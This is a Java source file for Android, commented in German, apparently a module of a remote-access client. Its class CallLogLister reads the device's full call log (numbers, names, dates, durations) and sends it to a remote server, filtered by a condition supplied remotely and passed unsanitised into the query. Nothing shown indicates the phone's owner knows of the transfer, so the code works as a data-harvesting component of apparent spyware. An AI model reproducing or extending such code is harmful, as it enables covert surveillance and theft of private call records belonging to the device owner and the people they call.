package my.app.Library;

import java.util.ArrayList;

import my.app.client.ClientListener;
import Packet.CallLogPacket;
import Packet.CallPacket;
import android.database.Cursor;
import android.net.Uri;
import android.provider.CallLog;

/**
 * Diese Klasse wird dazu benötigt die Anruflisten auszulesen.
 */
public class CallLogLister {

	/**
	 * Diese Methode liest die Anruflisten aus und speichert sie in einem Array, dass dann an den Server gesendet wird.
	 * @param c	Das Client-Objekt welches diese Methode aufgerufen hat
	 * @param channel Der Kanal zur Datenübertragung
	 * @param args	Hierbei handelt es sich um einen Filter für die SQL-Abfrage. Es ist die Where-Bedingung
	 * @return true wenn Anruflisten vorhanden, false sonst.
	 */
	public static boolean listCallLog(ClientListener c, int channel, byte[] args) {
		/**
		 * ArrayList l  In dieser ArrayList werden die Daten der Anrufliste gespeichert.
		 * Wurde die Liste erfolreich ausgelesen, wird es an den Server übermittelt.
		 */
		ArrayList<CallPacket> l = new ArrayList<CallPacket>();
		/**
		 * Dies ist die return Varibale, die angibt ob es eine Anrufliste gab oder nicht.
		 */
		boolean ret =false;
		/**
		 * Das args-Array wird hier in der Variablen WHERE_CONDITION gespeichert.
		 * Es handelt sich hierbei um den Filter, den der Benutzer einstellen kann.
		 * Es werden dann nur die Anrufe der Liste entnommen, auf welche die Bedingung zutrifft.
		 */
		String WHERE_CONDITION = new String(args);
		/**
		 * Die Ordnung nach der sortiert wurde. In diesem Fall werden die Einträge absteigend sortiert.
		 */
		String SORT_ORDER = "date DESC";
		//String[] column = { "_id", "type", "date", "duration", "number","name" ,"raw_contact_id" };
		/**
		 * Der Contentresolver kann auf die Daten zugreifen. Es handelt sich hierbei um eine Art SQL-Aufruf.
		 * Das Ergebnis wird in der Variablen cursor gespeichert
		 */
		Cursor cursor = c.getContentResolver().query(CallLog.Calls.CONTENT_URI, null, WHERE_CONDITION, null, SORT_ORDER);

		/**
		 * Sollte der cursor nicht leer sein, so wird der cursor auf das erste Element gesetzt.
		 */
        if(cursor.getCount() != 0) {
	        cursor.moveToFirst();
	        do{
				/**
				 * Liest die Daten aus dem Cursor aus und speichert diese in Variablen.
				 */
	           if(cursor.getColumnCount() != 0) {
	        	   int id = cursor.getInt(cursor.getColumnIndex("_id"));
	        	   int type = cursor.getInt(cursor.getColumnIndex("type"));
	        	   long date = cursor.getLong(cursor.getColumnIndex("date"));
	        	   long duration = cursor.getLong(cursor.getColumnIndex("duration"));
	        	   String number  = cursor.getString(cursor.getColumnIndex("number"));
	        	   String name = cursor.getString(cursor.getColumnIndex("name"));
	        	   int raw_contact_id = cursor.getInt(cursor.getColumnIndex("raw_contact_id"));
				   /**
					* Am Ende wird ein neues CallPacket, mit den gerade erhaltenen Daten,  erstelltund und dies der List l angehängt.
					*/
	        	   l.add(new CallPacket(id, type, date, duration, raw_contact_id, number, name));
	           }
	        }
			/**
			 * Dies wird solange getan bis es kein nächtes Element mehr gibt.
			 */
			while(cursor.moveToNext());
			/**
			 * Soblad die Liste 2 Elemente enthält, wird die Variable ret auf true gesetzt.
			 */
	        ret = true;
        }
        else
		/**
		 * Sollte der cursor zu wenig Elemente enthalten, wird ret auf false gesetzt.
		 */
        	ret = false;


		/**
		 * Mit Hilfe dieses Aufrufs werden die Daten an den Server geschickt.
		 * Hierzu muss jedoch erst ein CallLogPacket erstellt werden.
		 */
		c.handleData(channel, new CallLogPacket(l).build());
		/**
		 * return ret
		 */
		return ret;
	}
	
}
